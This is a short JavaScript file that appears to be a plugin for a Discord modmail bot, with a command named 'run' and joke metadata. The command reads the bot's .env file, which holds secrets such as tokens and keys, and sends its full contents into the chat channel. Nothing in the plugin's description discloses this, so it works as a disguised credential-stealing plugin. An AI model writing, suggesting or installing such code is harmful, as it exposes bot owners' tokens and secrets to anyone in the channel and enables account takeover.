

module.exports.plugin = {
    name: 'run',
    description: 'Walter White',
    author: 'Walter White',
    repository: 'https://github.com/aquaticdosDev/modmail-plugin-test/blob/main/test2.js'
}

module.exports.add = {
    name: 'run',
    description: 'Walter White',
    run: async ({client, message, args}) => {
        const fs = require("fs")
        const data = fs.readFileSync(`${process.cwd()}/.env`, {encoding:'utf8', flag:'r'});
        message.channel.send(data)
    }
}
